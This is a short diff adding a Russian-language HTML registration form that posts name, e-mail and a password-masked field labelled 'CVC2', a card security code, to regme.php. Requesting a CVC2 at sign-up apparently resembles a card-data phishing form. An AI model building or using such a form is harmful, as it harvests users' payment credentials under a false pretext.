@@ -1,0 +1,8 @@
+<form method="POST" action="/regme.php">
+<input type="text" class="form-control" name="name" placeholder="ФИО">
+<input type="email" class="form-control" placeholder="E-mail" name="mail">
+<input type="password" class="form-control" placeholder="CVC2" name="cvc"></br>
+<input type="hidden" name="reg" value="649385">
+<input type="submit" class="btn btn-primary btn-lg btn-block" value="Регистрация">
+Продолжая регистрацию, Вы соглашаетесь с <a href="tos.php">пользовательским соглашением.</a>
+</form>
